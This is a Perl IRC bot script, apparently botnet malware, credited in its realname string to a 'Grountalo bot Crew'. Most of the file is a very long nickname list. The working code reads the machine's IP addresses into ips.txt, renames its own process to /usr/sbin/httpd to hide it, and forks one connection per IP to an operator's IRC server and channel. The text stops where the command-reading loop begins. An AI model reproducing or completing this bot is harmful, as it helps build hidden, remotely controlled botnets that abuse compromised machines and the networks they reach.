#!/usr/bin/perl

######################
my $server = $ARGV[0];
my $port="6667";
my $channel="#abu";
my $owner= "Abu^";
my $procname="/usr/sbin/httpd";
######################

my @nickname = ("Grountalo001","Grountalo002","Grountalo003","Grountalo004","Grountalo005","Grountalo006","Grountalo007","Grountalo008","Grountalo009","Grountalo010","Grountalo011",
"Grountalo012","Grountalo013","Grountalo014","Grountalo015","Grountalo016","Grountalo017","Grountalo018","Grountalo019","Grountalo020","Grountalo021","Grountalo022","Grountalo023",
"Grountalo024","Grountalo025","Grountalo026","Grountalo027","Grountalo028","Grountalo029","Grountalo030","Grountalo031","Grountalo032","Grountalo033","Grountalo034","Grountalo035","Grountalo036","Grountalo037",
"Grountalo038","Grountalo039","Grountalo040","Grountalo041","Grountalo042","Grountalo043","Grountalo044","Grountalo045","Grountalo046","Grountalo047","Grountalo048","Grountalo049","Grountalo0050",
"Grountalo051","Grountalo052","Grountalo053","Grountalo054","Grountalo055","Grountalo056","Grountalo057","Grountalo058","Grountalo059","Grountalo060","Grountalo061","Grountalo062","Grountalo063",
"Grountalo064","Grountalo065","Grountalo066","Grountalo067","Grountalo068","Grountalo069","Grountalo070","Grountalo071","Grountalo072","Grountalo073","Grountalo074","Grountalo075","Grountalo076",
"Grountalo077","Grountalo078","Grountalo079","Grountalo080","Grountalo081","Grountalo082","Grountalo083","Grountalo084","Grountalo085","Grountalo086","Grountalo087","Grountalo088","Grountalo089",
"Grountalo090","Grountalo091","Grountalo092","Grountalo093","Grountalo094","Grountalo095","Grountalo096","Grountalo097","Grountalo098","Grountalo099","Grountalo100","Grountalo101",
"Grountalo102","Grountalo103","Grountalo104","Grountalo105","Grountalo106","Grountalo107","Grountalo108","Grountalo109","Grountalo110","Grountalo111","Grountalo112","Grountalo113","Grountalo114","Grountalo115",
"Grountalo116","Grountalo117","Grountalo118","Grountalo119","Grountalo120","Grountalo121","Grountalo122","Grountalo123","Grountalo124","Grountalo125","Grountalo126","Grountalo127","Grountalo128","Grountalo129",
"Grountalo130","Grountalo131","Grountalo132","Grountalo133","Grountalo134","Grountalo135","Grountalo136","Grountalo137","Grountalo138","Grountalo139","Grountalo140","Grountalo141","Grountalo142","Grountalo143",
"Grountalo144","Grountalo145","Grountalo146","Grountalo147","Grountalo148","Grountalo149","Grountalo150","Grountalo151","Grountalo152","Grountalo153","Grountalo154","Grountalo155","Grountalo156","Grountalo157",
"Grountalo158","Grountalo159","Grountalo160","Grountalo161","Grountalo162","Grountalo163","Grountalo164","Grountalo165","Grountalo166","Grountalo167","Grountalo168","Grountalo169","Grountalo170","Grountalo171","Grountalo172",
"Grountalo173","Grountalo174","Grountalo175","Grountalo176","Grountalo177","Grountalo178","Grountalo179","Grountalo180","Grountalo181","Grountalo182","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
"Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
"Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty",
"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio",
"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin",
"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine",
"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard",
"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell",
"Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton",
"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel",
"Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono",
"Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
"Zoldak","Zucconi","Zurn","Zwiers","Adams_","Addison_","Adelstein_","Adibe_","Adorno_","Ahlers_","Alavi_","Alcorn-","Alda-",
"Aleks_","Allison_","Alongi-","Altavilla_","Altenberger_","Altenhofen","Amaral_","Amatangelo-","Ameer_","Amsden_","Anand-","Andel-",
"Ando_","Andrelus_","Andron_","Anfinrud_","Ansley_","Anthony_","Antos_","Arbia_","Arduini_","Arellano_","Aristotle_","Arjas-","Arky-","Atkins-",
"Augustus","Aurelius","Axelrod","Axworthy-","Ayiemba-","Aykroyd-","Ayling_","Azima-","Bachmuth-","Backus-","Bady-","Baglivo-","Bagnold-",
"Bailar","Bakanowsky","Baleja_","Ballatori_","Ballew","Baltz_","Banta_","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola_","Barry_","Bartholomew-","Bartolome-","Bartoo-","Basavappa","Bashevis-","Batchelder-","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman-","Beder_","Bedford_","Behenna_","Belanger-","Belaoussof_","Belfer-","Belin-Collart-","Bellavance","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson-","Berke-Jenkins-","Bernardo-",        "Bernassola","Bernston-","Berrizbeitia-","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho-","Blackbourn-","Blackwell-","Blagg-","Blakemore-","Blanke-","Bliss-","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth-","Bolger-","Bolick-","Bollinger-","Bologna-","Boner","Bonham","Boniface-","Bontempo-","Book-","Bookbinder","Boone",
"Boorstin","Borack","Borden-","Bossi-","Bothman-","Botosh-","Boudin-","Boudrot-","Bourneuf-","Bowers","Boxer-","Boyajian-","Boyes-","Boyland-",
"Boym","Boyne","Bracalente-","Bradac-","Bradach-","Brecht-","Breed-","Brenan-","Brennan-","Brewer-","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki-","Buchan-","Budding-","Bullard-","Bunton-","Burden-","Burdzy-","Burke-","Burridge-","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecce","Leclercq-","Leite-","Lenard-","Sofia-","Lesser-","Lessi-","Liakos-","Lidano-","Liem-","Light","Lightfoot-","Lim-","Linares-","Linda-","Linder-",
"Line-","Linehan-","Linzee-","Lippmann","Lipponen","Little","Litvak-","Livernash-","Livi-","Livolsi-","Lizardo-","Locatelli-","Longworth-","Loss-","Loveman-",
"Lowenstein-","Loza-","Lubin-","Lucas-","Luciano-","Luczkow","Luecke-","Lunetta-","Luoma-","Lussier-","Lutcavage-","Luzader-","Ma-","Maccormac-","Macdonald-",
"Maceachern-","Macintyre-","Mackenney-","MacMillan","Macy","Madigan-","Maggio-","Mahony-","Maie-","Maine-Hershey","Maisano-","Malatesta-","Maller-",
"Malova-","Manalis-","Mandel-","Manganiello-","Mantovan-","March-","Marchbanks-","Marcus-","Margalit-","Margetts-","Marques-","Martinez-","Martochio-",
"Marton-","Marubini-","Mass-","Matalka-","Matarazzo-","Matsukata","Mattson-","Mauzy-","May-","Mazzali-","Mazziotta","Mcbride-","Mccaffery-","Mccall-",
"Mcclearn-","Mcdowell-","Mcelroy-","McFadden-","Mcghee-","Mcgoldrick","McIlroy","Mcintosh-","Mcdonald-","Mclane","Mclaren-","Mcneal-","Mcnulty-",
"Meccariello-","Memisoglu-","Menzies-","Merikoski-","Merlani","Merminod-","Merseth-","Merz","Metelka-","Metropolis-","Meurer-","Michelman-","Middle-",
"Mieher-","Mills-","Minh-","Mini-","Minichiello-","Gonzalez-","Mitropoulos-","Mittal-","Mocroft","Modestino-","Moeller-","Mohr-","Moiamedi","Monque-","Montilio-",
"MooreDeCh-.","Morani-","Moreton-","Morrison-","Morrow-","Mortimer-","Mosher-","Mosler-","Mostafavi-","Motooka-","Mudarri-","Muello-","Mugnai-","Mulkern-",
"Mulroy-","Mumford","Mussachio-","Naddeo-","Napolitano-","Nardi","Nardone-","Naviaux","Nayduch","Nelson-","Nenna-","Nesci-","Neuman-","Newfeld","Newlin-",
"Ng-","Ni-","Nickerson-","Nickoloff-","Nisenson-","Nitabach-","Notman-","Nuzum-","Ocougne-","Ogata-","Oh-","O'hagan-","Oldford-","Olsen-","Olson-","Olszewski",
"O'malley-","Oman-","O'meara-","Opel-","Oray","Orfield-","Orsi-","Ospina-","Ostrowski","Ottaviani","Otten","Ouchida-","Ovid-","PaesDealmeida-","Paine-",
"Palayoor-","Palepu-","Pallara-","Palmitesta-","Panadero-","Panizzon-","Pantilla-","Paoletti-","Parmeggiani-","Parris-","Partridge-","Pascucci-","Patefield-",
"Patrick-","Pattullo-","Pavetti-","Pavlon-","Pawloski","Paynter","Peabody-","Pearlberg","Pederson-","Peishel-","Penny-","Pereira-","Perko-","Perla-k",
"Perlman-","Perna-","Perone-","Perrimon-","Peter-s","Petruzello-","Pettibone-","Pettit","Pfister-","Pilbeam-","Pinot-","Plancon-","Plant-","Plasket-","Plous-",
"Po-","Pocobene-","Poincaire-","Pointer-","Poirie-r","Polak","Polanyi-","Politis-","Poma-","Poolman-","Powers-","Presper-","Preucel-","Prevost","Pritchard-",
"Pritz-","Proietti-","Prothrow-Stith-","Puccia-","Pugh-","Pynchon-","Quaday-","Quetin","Rabe-","Rabkin-","Radeke","Rajagopalan-","Raney-","Rangan-","Rankin-",
"Rapple-","Rayport-","Redden-Tyler-","Reedquist","Cunningham-","Reinold-","Remak-","Renick-","Repetto","Resnik","Rhea","Richmond-","Rielly-","Rindos",
"Rineer-","Rish-","Rivera-","Robinson-","Rocha-","Roesler","Rogers","Ronen-","Row","Royal-","Ru","Ruan","Ruderman","Ruescher-","Rush","Ryu-","Sabatello-",
"Sadler-","Safire-","Sahu","Sali","Samson-","Sanchez-Ramirez-","Sanna-","Sapers","Sarin-","Sartore","Sase","Satin","Satta-","Satterthwaite-","Sawtell-",
"Sayied-","Scarponi-","Scepan-","Scharf-","Scharlemann-","Scheine-r","Schiano","Schifini-","Schilling","Schmitt","Schossberger-","Schuman-","Schutte-",
"Schuyle-r","Schwan-","Schwickrath-","Scovel-","Scudder-","Seaton-","Seeber","Segal-","Sekler","Selvage","Sen","Sennett-","Seterdahl-","Sexton-",
"Seyfert-","Shaikh-","Shakis","Shankland-","Shanley-","Shar-","Shatrov","Shavelson-","Shea","Sheats","Shepherd","Sheppard-","Shepstone-","Shesko-","Shia-",
"Shibata-","Shimon-","Siesto-","Sigalot-","Sigini","Signa-","Silverman","Silvetti-","Sinsabaugh","Sirilli-","Sites-","Skane","Skerry-","Skoda-","Sloan-",
"Slowe-","Smilow-","Sniffen-","Snodgrass-","Socolow-","Solon","Somers","Sommariva-","Sorabella","Sorg-","Sottak","Soukup","Soule","Soultanian-","Spanie-r",
"Sparrow-","Spaulding-","Speizer-","Spence-","Sperber","Spicer-","Spiegelhalter-","Spiliotis","Spinrad-","StMartin","Stalvey","Stam-","Stang-","Stassinopolus-",
"States-","Statlender-","Stefani-","Steiner-","Stephanian-","Stepniewska","Stewart-Oaten","Stiepock-","Stillwell","Stock","Stockton-","Stockwell-","Stolzenberg-",
"Stonich","Storer-","Stott","Strange-","Strauch-","Streiff-","Stringer-","Sullivan-","Sumner-","Suo-","Surdam","Sweeting-","Sweetser-","Swindle","Tagiuri-",
"Tai","Talaugon-","Tambiah-","Tandler-","Tanowitz-","Tatar-","Taveras-","Tawn","Tcherepnin-","Teague-","Temes-","Temmer-","Tenney","Terracini","Than",
"Thavaneswaran-","Theodos-","Thibault-","Thisted-","Thomsen-","Throop-","Tierney","Till-","Timmons","Tofallis-","Tollestrup-","Tolls","Tolman","Tomford",
"Toomer-","Topulos-","Torresi-","Torske-","Towle-r","Toye-","Traebert-","Trenga-","Trewin-","Tringali","Troiani","Troy-","Truss-","Tsiatis-","Tsomides","Tsukurov-",
"Tuck-","Tudge-","Tukan-","Turano-","Ture-k","Tuttle-","Twells-","Tzamarias-","Ullman-","Untermeyer","Upsdell","Urban-","Urdang-Brown","Usdan-","Uzuner",
"Vacca-","Waite-","Valberg","Valencia","Wales","Wallenberg-","Walter-","vanAllen-","VanZwet","Vandenberg","Vanheeckeren-","Warshafsky-","Wasowska-","Vasquez-",
"Waugh-","Weighart-","Weingarten-","Weinhaus-","Weissbourd-","Weissman-","Velasquez-","Welles","Welsh","Wengret-","Venne","Verghese-","Wescott-","Wetzel-",
"Whately-","Whilton-","White-","Whitla-","Whittaker","Viana","Viano-","Wiedersheim-","Wiener-","Viens-","Vignola-","Wilder","Wilhelm-","Wilk","Wilkin-","Wilkinson",
"Villarreal-","Willstatter-","Wilson-","Vitali-","Viviani","Voigt-","Wolk","VonHoffman-","Woo-","Wooden-","Woods","Woods-Powell-","Vorhaus-","Votey-","Yacono-",
"Yamane","Yankee-","Yarchu-k","Yates-","Ybarra-","Yedidia-","Yesson-","Yetiv","Yoffe-","Yoo-","Youk-See-","Yu-","Zachary-","Zahedi-","Zangwill-","Zegans-","Zerbini",
"Zoldak-","Zucconi-","Zurn-","Kezia17","Aisha17","Anggie17","Imut17","Mungil17","Aishaku","Fara","Alea`sick","Aisha`cute","Aisha`luvly","Aisha`Rose","Aisha`sweet","Aisha_lutu","Devina17","Devina17","Imut17","Mungil17","Devinaku","Fara","Feby`sick","Devina`cute","Devina`luvly","Devina`Rose","Devina`sweet","Devina_lutu","Zea99","Zea99","Imut99","Mungil99","Zeaku","Fara","Neina`sick","Zea`cute","Zea`luvly","Zea`Rose","Zea`sweet","Zea_lutu","D3viLku","Veina","Alea`sick","D3viL`Dita","D3viL`luvly","D3viL`Rose","D3viL`sweet","D3viL_lutu","Nita17","Nita17","Dita17","luvly17","Nitaku","Veina","Irene`sick","Nita`Dita","Nita`luvly","Nita`Rose","Nita`sweet","Nita_lutu","Zenita99","Zenita99","Dita99","luvly99","Zenitaku","Veina","Neina`sick","Zenita`Dita","Zenita`luvly");

my @realname  = ("130,9-=0,2[[0,9Grountalo bot Crew0,2]]0,4=-");
my @WHO;
my $qqum="*";
$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n+ putri-bot\n";
 print "+ Aturan Pakai : perl $0 (server)\n";
 print "+ betulin dulu sekripnya boss..\n\n";
 exit(1);
}
$SIG{CHLD} = sub { wait }; # alterando o signal
my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
@ips = (@ips1, @ips2, @fbsd);
open(ipzitcho,">ips.txt") || die "- ips.txt not found";
          print ipzitcho" @ips";
          close(ipzitcho);
@ips = grep { s/\n$// } @ips;
$0 =  $procname  . "\0";
$nick2 = $nick;
print STDOUT "\n+ user\n";
print STDOUT "+ Server : $server\n";
print STDOUT "+ Port   : $port\n";
print STDOUT "+ Owner  : $owner\n";
print STDOUT "+ Channel: $channel\n";
print STDOUT "+ IPs    : $qtip\n\n";
use IO::Socket;
foreach my $FROM (@ips) {
 my $pid = fork(); # gerando um novo processo
  unless ($pid) {   #
my $ident = $nickname[rand scalar @nickname];
my $nick = $nickname[rand scalar @nickname];
my $name = $realname[rand scalar @realname];
$sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
   print $sock "NICK ".$nick."\n";
    print $sock "USER $ident $FROM $server :$name\n";
while (<$sock>) {
